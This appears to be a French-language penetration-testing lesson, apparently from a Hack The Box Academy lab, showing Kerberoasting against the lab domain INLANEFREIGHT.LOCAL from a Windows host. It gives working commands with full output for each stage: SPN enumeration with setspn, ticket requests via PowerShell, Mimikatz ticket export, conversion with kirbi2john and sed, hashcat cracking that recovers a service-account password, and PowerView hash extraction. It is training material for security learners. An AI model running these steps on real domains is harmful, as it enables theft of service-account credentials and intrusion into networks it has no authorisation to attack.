Kerberoasting - à partir de Windows
===================================

* * * * *

Kerberoasting - Méthode semi-manuelle
-------------------------------------

Avant que des outils comme `Rubeus`ceux-ci n'existent, voler ou falsifier des tickets Kerberos était un processus manuel complexe. Au fur et à mesure que la tactique et les défenses ont évolué, nous pouvons désormais effectuer le Kerberoasting à partir de Windows de plusieurs manières. Pour commencer dans cette voie, nous allons explorer la voie manuelle, puis passer à des outils plus automatisés. Commençons par le binaire [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) intégré pour énumérer les SPN dans le domaine.

#### Énumération des SPN avec setspn.exe

  Énumération des SPN avec setspn.exe

```
C:\htb> setspn.exe -Q */*

Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
        exchangeAB/ACADEMY-EA-DC01
        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        TERMSRV/ACADEMY-EA-DC01
        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL

<SNIP>

CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local
CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        sts/inlanefreight.local

<SNIP>

CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SPSJDB.inlanefreight.local:1433
CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        adfsconnect/azure01.inlanefreight.local

Existing SPN found!

```

Nous remarquerons que de nombreux SPN différents sont renvoyés pour les différents hôtes du domaine. Nous allons nous concentrer sur `user accounts`et ignorer les comptes d'ordinateur renvoyés par l'outil. Ensuite, en utilisant PowerShell, nous pouvons demander des tickets TGS pour un compte dans le shell ci-dessus et les charger en mémoire. Une fois qu'ils sont chargés en mémoire, nous pouvons les extraire en utilisant `Mimikatz`. Essayons ceci en ciblant un seul utilisateur :

#### Cibler un seul utilisateur

  Cibler un seul utilisateur

```
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

```

Avant de continuer, décomposons les commandes ci-dessus pour voir ce que nous faisons (qui est essentiellement ce qui est utilisé par [Rubeus](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) lors de l'utilisation de la méthode Kerberoasting par défaut) :

-   L' applet de commande [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) est utilisée pour ajouter une classe de framework .NET à notre session PowerShell, qui peut ensuite être instanciée comme n'importe quel objet de framework .NET
-   Le `-AssemblyName`paramètre nous permet de spécifier un assembly qui contient les types que nous souhaitons utiliser
-   [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) est un espace de noms qui contient différentes classes pour la création de services de jeton de sécurité
-   Nous utiliserons ensuite l' applet de commande [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) pour créer une instance d'un objet .NET Framework
-   Nous allons utiliser l' espace de noms [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) avec la classe [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) pour créer un jeton de sécurité et transmettre le nom SPN à la classe pour demander un ticket Kerberos TGS pour le compte cible dans notre session de connexion en cours.

On peut aussi choisir de récupérer tous les tickets en utilisant la même méthode, mais cela va aussi extraire tous les comptes informatiques, donc ce n'est pas optimal.

#### Récupération de tous les tickets à l'aide de setspn.exe

  Récupération de tous les tickets à l'aide de setspn.exe

```
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:56:18 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : exchangeAB/ACADEMY-EA-DC01
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-4
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:56:18 PM
ValidTo              : 2/24/2022 11:58:18 PM
ServicePrincipalName : kadmin/changepw
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-5
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:56:18 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : WSMAN/ACADEMY-EA-MS01
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

<SNIP>

```

La commande ci-dessus combine la commande précédente avec `setspn.exe`pour demander des tickets pour tous les comptes avec des SPN définis.

Maintenant que les tickets sont chargés, nous pouvons utiliser `Mimikatz`pour extraire le(s) ticket(s) de `memory`.

Extraire des tickets de la mémoire avec Mimikatz
------------------------------------------------

  Récupération de tous les tickets à l'aide de setspn.exe

```
Using 'mimikatz.log' for logfile : OK

mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export

<SNIP>

[00000002] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
====================
Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
====================
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
ZWZyZWlnaHQubG9jYWw6MTQzMw==
====================

   * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi

<SNIP>

```

Si nous ne spécifions pas la `base64 /out:true`commande, Mimikatz extraira les tickets et les écrira dans `.kirbi`des fichiers. Selon notre position sur le réseau et si nous pouvons facilement déplacer des fichiers vers notre hôte d'attaque, cela peut être plus facile lorsque nous allons casser les tickets. Prenons le blob base64 récupéré ci-dessus et préparons-le pour le crack.

Ensuite, nous pouvons prendre le blob base64 et supprimer les nouvelles lignes et les espaces blancs puisque la sortie est enveloppée de colonne, et nous avons besoin de tout sur une seule ligne pour l'étape suivante.

#### Préparation du blob Base64 pour le craquage

  Préparation du blob Base64 pour le craquage

```
dsgsec@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n

doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1TUUwuaW5sYW5lZnJlaWdodC5sb2NhbDoxNDMzo4IEvzCCBLugAwIBF6EDAgECooIErQSCBKmBMUn7JhVJpqG0ll7UnRuoeoyRtHxTS8JY1cl6z0M4QbLvJHi0JYZdx1w5sdzn9Q3tzCn8ipeu+NUaIsVyDuYU/LZG4o2FS83CyLNiu/r2Lc2ZM8Ve/rqdd+TGxvUkr+5caNrPy2YHKRogzfsO8UQFU1anKW4ztEB1S+f4d1SsLkhYNI4q67cnCy00UEf4gOF6zAfieo91LDcryDpi1UII0SKIiT0yr9IQGR3TssVnl70acuNac6eCC+Ufvyd7g9gYH/9aBc8hSBp7RizrAcN2HFCVJontEJmCfBfCk0Ex23G8UULFic1w7S6/V9yj9iJvOyGElSk1VBRDMhC41712/sTraKRd7rw+fMkx7YdpMoU2dpEj9QQNZ3GRXNvGyQFkZp+sctI6Yx/vJYBLXI7DloCkzClZkp7c40u+5q/xNby7smpBpLToi5NoltRmKshJ9W19aAcb4TnPTfr2ZJcBUpf5tEza7wlsjQAlXsPmL3EF2QXQsvOc74PbTYEnGPlejJkSnzIHs4a0wy99V779QR4ZwhgUjRkCjrAQPWvpmuI6RU9vOwM50A0nh580JZiTdZbK2tBorD2BWVKgU/h9h7JYR4S52DBQ7qmnxkdM3ibJD0o1RgdqQO03TQBMRl9lRiNJnKFOnBFTgBLPAN7jFeLtREKTgiUC1/aFAi5h81aOHbJbXP5aibM4eLbj2wXp2RrWOCD8t9BEnmat0T8e/O3dqVM52z3JGfHK/5aQ5Us+T5qM9pmKn5v1XHou0shzgunaYPfKPCLgjMNZ8+9vRgOlry/CgwO/NgKrm8UgJuWMJ/skf9QhD0UkT9cUhGhbg3/pVzpTlk1UrP3n+WMCh2Tpm+p7dxOctlEyjoYuQ9iUY4KI6s6ZttT4tmhBUNua3EMlQUO3fzLr5vvjCd3jt4MF/fD+YFBfkAC4nGfHXvbdQl4E++Ol6/LXihGjktgVop70jZRX+2x4DrTMB9+mjC6XBUeIlS9a2Syo0GLkpolnhgMC/ZYwF0r4MuWZu1/KnPNB16EXaGjZBzeW3/vUjv6ZsiL0J06TBm3mRrPGDR3ZQHLdEh3QcGAk0Rc4p16+tbeGWlUFIg0PA66m01mhfzxbZCSYmzG25S0cVYOTqjToEgT7EHN0qIhNyxb2xZp2oAIgBP2SFzS4cZ6GlLoNf4frRvVgevTrHGgba1FA28lKnqf122rkxx+8ECSiW3esAL3FSdZjc9OQZDvo8QB5MKQSTpnU/LYXfb1WafsGFw07inXbmSgWS1XkVNCOd/kXsd0uZI2cfrDLK4yg7/ikTR6l/dZ+Adp5BHpKFAb3YfXjtpRM6+1FN56hTnoCfIQ/pAXAfIOFohAvB5Z6fLSIP0TuctSqejiycB53N0AWoBGT9bF4409M8tjq32UeFiVp60IcdOjV4Mwan6tYpLm2O6uwnvw0J+Fmf5x3Mbyr42RZhgQKcwaSTfXm5oZV57Di6I584CgeD1VN6C2d5sTZyNKjb85lu7M3pBUDDOHQPAD9l4Ovtd8O6Pur+jWFIa2EXm0H/efTTyMR665uahGdYNiZRnpm+ZfCc9LfczUPLWxUOOcaBX/uq6OCAQEwgf6gAwIBAKKB9gSB832B8DCB7aCB6jCB5zCB5KAbMBmgAwIBF6ESBBB3DAViYs6KmIFpubCAqyQcoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiGDAWoAMCAQGhDzANGwtodGItc3R1ZGVudKMHAwUAQKEAAKURGA8yMDIyMDIyNDIzMzYyMlqmERgPMjAyMjAyMjUwODU1MjVapxEYDzIwMjIwMzAzMjI1NTI1WqgVGxNJTkxBTkVGUkVJR0hULkxPQ0FMqTswOaADAgECoTIwMBsITVNTUUxTdmMbJERFVi1QUkUtU1FMLmlubGFuZWZyZWlnaHQubG9jYWw6MTQzMw==

```

Nous pouvons placer la seule ligne de sortie ci-dessus dans un fichier et la reconvertir en `.kirbi`fichier à l'aide de l' `base64`utilitaire.

#### Placer la sortie dans un fichier au format .kirbi

  Placer la sortie dans un fichier au format .kirbi

```
dsgsec@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi

```

Ensuite, nous pouvons utiliser [cette](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version de l' `kirbi2john.py`outil pour extraire le ticket Kerberos du fichier TGS.

#### Extraction du ticket Kerberos à l'aide de kirbi2john.py

  Extraction du ticket Kerberos à l'aide de kirbi2john.py

```
dsgsec@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi

```

Cela créera un fichier nommé `crack_file`. Nous devons ensuite modifier un peu le fichier pour pouvoir utiliser Hashcat contre le hachage.

#### Modification de crack_file pour Hashcat

  Modification de crack_file pour Hashcat

```
dsgsec@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

```

Nous pouvons maintenant vérifier et confirmer que nous avons un hachage qui peut être transmis à Hashcat.

#### Affichage du hachage préparé

  Affichage du hachage préparé

```
dsgsec@htb[/htb]$ cat sqldev_tgs_hashcat

$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf21481a7b462ceb01c3761c50952689ed1099827c17c2934131db71bc5142c589cd70ed2ebf57dca3f6226f3b21849529355414433210b8d7bd76fec4eb68a45deebc3e7cc931ed8769328536769123f5040d6771915cdbc6c90164669fac72d23a631fef25804b5c8ec39680a4cc2959929edce34bbee6aff135bcbbb26a41a4b4e88b936896d4662ac849f56d7d68071be139cf4dfaf66497015297f9b44cdaef096c8d00255ec3e62f7105d905d0b2f39cef83db4d812718f95e8c99129f3207b386b4c32f7d57befd411e19c218148d19028eb0103d6be99ae23a454f6f3b0339d00d27879f342598937596cadad068ac3d815952a053f87d87b2584784b9d83050eea9a7c6474cde26c90f4a3546076a40ed374d004c465f654623499ca14e9c11538012cf00dee315e2ed444293822502d7f685022e61f3568e1db25b5cfe5a89b33878b6e3db05e9d91ad63820fcb7d0449e66add13f1efceddda95339db3dc919f1caff9690e54b3e4f9a8cf6998a9f9bf55c7a2ed2c87382e9da60f7ca3c22e08cc359f3ef6f4603a5af2fc28303bf3602ab9bc52026e58c27fb247fd4210f45244fd71484685b837fe9573a53964d54acfde7f963028764e99bea7b77139cb651328e862e43d894638288eace99b6d4f8b6684150db9adc43254143b77f32ebe6fbe309dde3b78305fdf0fe60505f9000b89c67c75ef6dd425e04fbe3a5ebf2d78a11a392d815a29ef48d9457fb6c780eb4cc07dfa68c2e97054788952f5ad92ca8d062e4a68967860302fd9630174af832e599bb5fca9cf341d7a1176868d9073796dffbd48efe99b222f4274e93066de646b3c60d1dd94072dd121dd0706024d11738a75ebeb5b7865a5505220d0f03aea6d359a17f3c5b6424989b31b6e52d1c558393aa34e81204fb107374a8884dcb16f6c59a76a0022004fd921734b8719e8694ba0d7f87eb46f5607af4eb1c681b6b5140dbc94a9ea7f5db6ae4c71fbc1024a25b77ac00bdc549d66373d390643be8f1007930a4124e99d4fcb6177dbd5669fb06170d3b8a75db9928164b55e454d08e77f917b1dd2e648d9c7eb0cb2b8ca0eff8a44d1ea5fdd67e01da79047a4a1406f761f5e3b6944cebed45379ea14e7a027c843fa405c07c8385a2102f07967a7cb4883f44ee72d4aa7a38b2701e77374016a01193f5b178e34f4cf2d8eadf651e162569eb421c74e8d5e0cc1a9fab58a4b9b63babb09efc3427e1667f9c7731bcabe3645986040a7306924df5e6e68655e7b0e2e88e7ce0281e0f554de82d9de6c4d9c8d2a36fce65bbb337a415030ce1d03c00fd9783afb5df0ee8fbabfa358521ad845e6d07fde7d34f2311ebae6e6a119d60d899467a66f997c273d2df73350f2d6c5438e71a057feeab

```

Nous pouvons ensuite exécuter à nouveau le ticket via Hashcat et obtenir le mot de passe en clair `database!`.

#### Casser le hachage avec Hashcat

  Casser le hachage avec Hashcat

```
dsgsec@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt

<SNIP>

$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf21481a7b462ceb01c3761c50952689ed1099827c17c2934131db71bc5142c589cd70ed2ebf57dca3f6226f3b21849529355414433210b8d7bd76fec4eb68a45deebc3e7cc931ed8769328536769123f5040d6771915cdbc6c90164669fac72d23a631fef25804b5c8ec39680a4cc2959929edce34bbee6aff135bcbbb26a41a4b4e88b936896d4662ac849f56d7d68071be139cf4dfaf66497015297f9b44cdaef096c8d00255ec3e62f7105d905d0b2f39cef83db4d812718f95e8c99129f3207b386b4c32f7d57befd411e19c218148d19028eb0103d6be99ae23a454f6f3b0339d00d27879f342598937596cadad068ac3d815952a053f87d87b2584784b9d83050eea9a7c6474cde26c90f4a3546076a40ed374d004c465f654623499ca14e9c11538012cf00dee315e2ed444293822502d7f685022e61f3568e1db25b5cfe5a89b33878b6e3db05e9d91ad63820fcb7d0449e66add13f1efceddda95339db3dc919f1caff9690e54b3e4f9a8cf6998a9f9bf55c7a2ed2c87382e9da60f7ca3c22e08cc359f3ef6f4603a5af2fc28303bf3602ab9bc52026e58c27fb247fd4210f45244fd71484685b837fe9573a53964d54acfde7f963028764e99bea7b77139cb651328e862e43d894638288eace99b6d4f8b6684150db9adc43254143b77f32ebe6fbe309dde3b78305fdf0fe60505f9000b89c67c75ef6dd425e04fbe3a5ebf2d78a11a392d815a29ef48d9457fb6c780eb4cc07dfa68c2e97054788952f5ad92ca8d062e4a68967860302fd9630174af832e599bb5fca9cf341d7a1176868d9073796dffbd48efe99b222f4274e93066de646b3c60d1dd94072dd121dd0706024d11738a75ebeb5b7865a5505220d0f03aea6d359a17f3c5b6424989b31b6e52d1c558393aa34e81204fb107374a8884dcb16f6c59a76a0022004fd921734b8719e8694ba0d7f87eb46f5607af4eb1c681b6b5140dbc94a9ea7f5db6ae4c71fbc1024a25b77ac00bdc549d66373d390643be8f1007930a4124e99d4fcb6177dbd5669fb06170d3b8a75db9928164b55e454d08e77f917b1dd2e648d9c7eb0cb2b8ca0eff8a44d1ea5fdd67e01da79047a4a1406f761f5e3b6944cebed45379ea14e7a027c843fa405c07c8385a2102f07967a7cb4883f44ee72d4aa7a38b2701e77374016a01193f5b178e34f4cf2d8eadf651e162569eb421c74e8d5e0cc1a9fab58a4b9b63babb09efc3427e1667f9c7731bcabe3645986040a7306924df5e6e68655e7b0e2e88e7ce0281e0f554de82d9de6c4d9c8d2a36fce65bbb337a415030ce1d03c00fd9783afb5df0ee8fbabfa358521ad845e6d07fde7d34f2311ebae6e6a119d60d899467a66f997c273d2df73350f2d6c5438e71a057feeab:database!

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965e...7feeab
Time.Started.....: Thu Feb 24 22:03:03 2022 (8 secs)
Time.Estimated...: Thu Feb 24 22:03:11 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1150.5 kH/s (9.76ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8773632/14344385 (61.16%)
Rejected.........: 0/8773632 (0.00%)
Restore.Point....: 8749056/14344385 (60.99%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: davius -> darjes

Started: Thu Feb 24 22:03:00 2022
Stopped: Thu Feb 24 22:03:11 2022

```

Si nous décidons de sauter la sortie base64 avec Mimikatz et de taper `mimikatz # kerberos::list /export`, le fichier .kirbi (ou les fichiers) sera écrit sur le disque. Dans ce cas, nous pouvons télécharger le ou les fichiers et `kirbi2john.py`les exécuter directement, en sautant l'étape de décodage en base64.

Maintenant que nous avons vu la manière plus ancienne et plus manuelle d'effectuer le Kerberoasting à partir d'une machine Windows et le traitement hors ligne, examinons quelques méthodes plus rapides. La plupart des évaluations sont limitées dans le temps et nous devons souvent travailler aussi rapidement et efficacement que possible, de sorte que la méthode ci-dessus ne sera probablement pas notre solution à chaque fois. Cela étant dit, il peut être utile pour nous d'avoir d'autres astuces dans nos manches et méthodologies au cas où nos outils automatisés tomberaient en panne ou seraient bloqués.

* * * * *

Route automatisée/basée sur l'outil
-----------------------------------

Ensuite, nous aborderons deux manières beaucoup plus rapides d'effectuer Kerberoasting à partir d'un hôte Windows. Tout d'abord, utilisons [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) pour extraire les tickets TGS et les convertir au format Hashcat. Nous pouvons commencer par énumérer les comptes SPN.

#### Utilisation de PowerView pour extraire les tickets TGS

  Utilisation de PowerView pour extraire les tickets TGS

```
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor

```

À partir de là, nous pourrions cibler un utilisateur spécifique et récupérer le ticket TGS au format Hashcat.

#### Utilisation de PowerView pour cibler un utilisateur spécifique

  Utilisation de PowerView pour cibler un utilisateur spécifique

```
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

SamAccountName       : sqldev
DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433*$BF9729001
                       376B63C5CAC933493C58CE7$4029DBBA2566AB4748EDB609CA47A6E7F6E0C10AF50B02D10A6F92349DDE3336018DE177
                       AB4FF3CE724FB0809CDA9E30703EDDE93706891BCF094FE64387B8A32771C7653D5CFB7A70DE0E45FF7ED6014B5F769F
                       DC690870416F3866A9912F7374AE1913D83C14AB51E74F200754C011BD11932464BEDA7F1841CCCE6873EBF0EC5215C0
                       12E1938AEC0E02229F4C707D333BD3F33642172A204054F1D7045AF3303809A3178DD7F3D8C4FB0FBB0BB412F3BD5526
                       7B1F55879DFB74E2E5D976C4578501E1B8F8484A0E972E8C45F7294DA90581D981B0F177D79759A5E6282D86217A03A9
                       ADBE5EEB35F3924C84AE22BBF4548D2164477409C5449C61D68E95145DA5456C548796CC30F7D3DDD80C48C84E3A538B
                       019FB5F6F34B13859613A6132C90B2387F0156F3C3C45590BBC2863A3A042A04507B88FD752505379C42F32A14CB9E44
                       741E73285052B70C1CE5FF39F894412010BAB8695C8A9BEABC585FC207478CD91AE0AD03037E381C48118F0B65D25847
                       B3168A1639AF2A534A63CF1BC9B1AF3BEBB4C5B7C87602EEA73426406C3A0783E189795DC9E1313798C370FD39DA53DD
                       CFF32A45E08D0E88BC69601E71B6BD0B753A10C36DB32A6C9D22F90356E7CD7D768ED484B9558757DE751768C99A64D6
                       50CA4811D719FC1790BAE8FE5DB0EB24E41FF945A0F2C80B4C87792CA880DF9769ABA2E87A1ECBF416641791E6A762BF
                       1DCA96DDE99D947B49B8E3DA02C8B35AE3B864531EC5EE08AC71870897888F7C2308CD8D6B820FCEA6F584D1781512AC
                       089BFEFB3AD93705FDBA1EB070378ABC557FEA0A61CD3CB80888E33C16340344480B4694C6962F66CB7636739EBABED7
                       CB052E0EAE3D7BEBB1E7F6CF197798FD3F3EF7D5DCD10CCF9B4AB082CB1E199436F3F271E6FA3041EF00D421F4792A0A
                       DCF770B13EDE5BB6D4B3492E42CCCF208873C5D4FD571F32C4B761116664D9BADF425676125F6BF6C049DD067437858D
                       0866BE520A2EBFEA077037A59384A825E6AAA99F895A58A53313A86C58D1AA803731A849AE7BAAB37F4380152F790456
                       37237582F4CA1C5287F39986BB233A34773102CB4EAE80AFFFFEA7B4DCD54C28A824FF225EA336DE28F4141962E21410
